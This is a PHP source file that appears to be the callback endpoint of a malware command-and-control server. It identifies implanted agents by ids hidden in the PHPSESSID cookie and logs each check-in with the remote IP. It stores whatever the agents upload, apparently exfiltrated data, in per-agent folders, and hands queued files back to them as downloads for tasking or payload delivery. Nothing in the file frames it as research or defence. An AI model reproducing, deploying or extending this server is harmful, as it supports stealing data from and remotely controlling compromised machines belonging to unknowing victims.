
<?php

// Get the binary id and agent id from the session cookie
$phpsessid = $_COOKIE['PHPSESSID'];
$binaryid = hexdec(substr($phpsessid, 0, 8));
$agentid = hexdec(substr($phpsessid, 8, 8));


// Get the upload and download directory for the agent
$server_dir = dirname(getcwd()) . DIRECTORY_SEPARATOR;
$agents_dir = $server_dir . DIRECTORY_SEPARATOR . "agent";
$current_agent_dir = $agents_dir . DIRECTORY_SEPARATOR . $binaryid . DIRECTORY_SEPARATOR . $agentid;
$upload_dir =  $current_agent_dir . DIRECTORY_SEPARATOR . "uploads";
$sent_dir = $current_agent_dir . DIRECTORY_SEPARATOR . "sents";
$download_dir = $current_agent_dir . DIRECTORY_SEPARATOR . "downloads";
$admin_dir = $current_agent_dir . DIRECTORY_SEPARATOR .  "admin";
$message_extension = ".bin";


// Create the upload directory if it doesn't already exist
if (!file_exists($upload_dir)){
	if (!mkdir( $upload_dir, 0777, true )){
		die("ERROR: Failed to create upload dir: $upload_dir\n");
	}
}

// Create the sent directory if it doesn't already exist
if (!file_exists($sent_dir)){
	if (!mkdir( $sent_dir, 0777, true )){
		die("ERROR: Failed to create sent dir: $upload_dir\n");
	}
}


// Create the download directory if it doesn't already exist
if (!file_exists($download_dir)){
	if (!mkdir( $download_dir, 0777, true )){
		die("ERROR: Failed to create download dir: $download_dir\n");
	}
}


// Create a callback log entry
$log_file = $admin_dir . DIRECTORY_SEPARATOR . "callbacks.log";


// Include callback log headers if the log doesn't exist
$log_header = "binaryid , agentid  , remote_addr     , date" . PHP_EOL;
if (!file_exists($log_file)){
	file_put_contents($log_file, $log_header, FILE_APPEND);
}


// Log the binary id, agent id, remote ip address, and date/time
$log_message = $binaryid .  
	" , " . $agentid .  
	" , " . $_SERVER['REMOTE_ADDR'] . 
	" , " . date("c") . 
	PHP_EOL;
file_put_contents($log_file, $log_message, FILE_APPEND);


// Check if we have anything else that the agent wants to upload
$upload_contents = file_get_contents('php://input');
if ($upload_contents) {
	$upload_base_name = 	date("Ymd-HisO") . "-" .
				$binaryid .  "-" . 
				$agentid . "-" . 
				$_SERVER['REMOTE_ADDR'] . $message_extension;
	$upload_file = $upload_dir . DIRECTORY_SEPARATOR . $upload_base_name;
	error_log( "upload_file: " . $upload_file . PHP_EOL );
	$upload_handle = fopen($upload_file, "xb") or die("ERROR: Unable to open/create upload file");
	fwrite($upload_handle, $upload_contents);
	fclose($upload_handle);
}



// Check if we have anything for the agent to download
$download_listing = scandir($download_dir);
foreach ($download_listing as $key => $value){
	$download_file = $download_dir . DIRECTORY_SEPARATOR . $value;
	$sent_file = $sent_dir. DIRECTORY_SEPARATOR . $value;
	if (is_file($download_file)) {
		$download_handle = fopen($download_file, "rb") or die("ERROR: Unable to open download file");
		fpassthru($download_handle);
		fclose($download_handle);
		rename( $download_file, $sent_file );
	}
	
}


?>

